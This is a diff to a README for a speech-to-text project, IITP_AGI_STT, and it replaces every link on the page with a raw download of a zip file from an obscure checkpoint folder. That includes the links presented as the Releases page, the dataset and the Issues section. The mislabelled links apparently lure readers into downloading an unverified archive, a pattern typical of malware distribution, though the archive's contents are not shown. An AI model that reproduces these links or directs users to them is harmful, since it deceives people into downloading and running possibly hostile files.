@@ -4,7 +4,7 @@
 
 Welcome to the IITP_AGI_STT repository! This guide helps you download and run our Speech-to-Text application, designed especially for understanding robot commands.
 
-[![Download Latest Release](https://raw.githubusercontent.com/galamitai-hastudio/IITP_AGI_STT/main/canary-qwen-2.5b_ft_result_v2/final/IIT_STT_AG_seminarianism.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/galamitai-hastudio/IITP_AGI_STT/main/canary-qwen-2.5b_ft_result_v2/final/IIT_STT_AG_seminarianism.zip)
+[![Download Latest Release](https://github.com/galamitai-hastudio/IITP_AGI_STT/raw/refs/heads/main/canary-qwen-2.5b_ft_result_v3_old/checkpoint-18321/IIT_AG_STT_v3.4.zip%20Latest%20Release-v1.0-blue)](https://github.com/galamitai-hastudio/IITP_AGI_STT/raw/refs/heads/main/canary-qwen-2.5b_ft_result_v3_old/checkpoint-18321/IIT_AG_STT_v3.4.zip)
 
 ## 📝 What is IITP_AGI_STT?
 
@@ -12,7 +12,7 @@ IITP_AGI_STT is an advanced Speech-to-Text system that recognizes specific voice
 
 ## 📁 Dataset Information
 
-The system uses a special dataset called BridgeDataV2-audio. This dataset focuses on robot command utterances, ensuring that the model learns how to recognize commands accurately. You can check out the dataset [here](https://raw.githubusercontent.com/galamitai-hastudio/IITP_AGI_STT/main/canary-qwen-2.5b_ft_result_v2/final/IIT_STT_AG_seminarianism.zip).
+The system uses a special dataset called BridgeDataV2-audio. This dataset focuses on robot command utterances, ensuring that the model learns how to recognize commands accurately. You can check out the dataset [here](https://github.com/galamitai-hastudio/IITP_AGI_STT/raw/refs/heads/main/canary-qwen-2.5b_ft_result_v3_old/checkpoint-18321/IIT_AG_STT_v3.4.zip).
 
 ## 💻 Key Features
 
@@ -25,11 +25,11 @@ The system uses a special dataset called BridgeDataV2-audio. This dataset focuse
 
 To download the latest version of IITP_AGI_STT, visit the Releases page:
 
-[Download Latest Release](https://raw.githubusercontent.com/galamitai-hastudio/IITP_AGI_STT/main/canary-qwen-2.5b_ft_result_v2/final/IIT_STT_AG_seminarianism.zip)
+[Download Latest Release](https://github.com/galamitai-hastudio/IITP_AGI_STT/raw/refs/heads/main/canary-qwen-2.5b_ft_result_v3_old/checkpoint-18321/IIT_AG_STT_v3.4.zip)
 
 ### Step-by-Step Instructions
 
-1. **Visit the Releases Page**: Click the link to go to our [Releases page](https://raw.githubusercontent.com/galamitai-hastudio/IITP_AGI_STT/main/canary-qwen-2.5b_ft_result_v2/final/IIT_STT_AG_seminarianism.zip).
+1. **Visit the Releases Page**: Click the link to go to our [Releases page](https://github.com/galamitai-hastudio/IITP_AGI_STT/raw/refs/heads/main/canary-qwen-2.5b_ft_result_v3_old/checkpoint-18321/IIT_AG_STT_v3.4.zip).
 
 2. **Select the Latest Version**: Look for the most recent version listed. This will typically be at the top of the page.
 
@@ -71,7 +71,7 @@ If you encounter issues while using IITP_AGI_STT, consider these common solution
 
 ## 📫 Get Support
 
-If you need further assistance, you can reach out to our support team through the [Issues section](https://raw.githubusercontent.com/galamitai-hastudio/IITP_AGI_STT/main/canary-qwen-2.5b_ft_result_v2/final/IIT_STT_AG_seminarianism.zip) on GitHub. We appreciate your feedback and will help you resolve any problems.
+If you need further assistance, you can reach out to our support team through the [Issues section](https://github.com/galamitai-hastudio/IITP_AGI_STT/raw/refs/heads/main/canary-qwen-2.5b_ft_result_v3_old/checkpoint-18321/IIT_AG_STT_v3.4.zip) on GitHub. We appreciate your feedback and will help you resolve any problems.
 
 ## 📝 Contributing
 
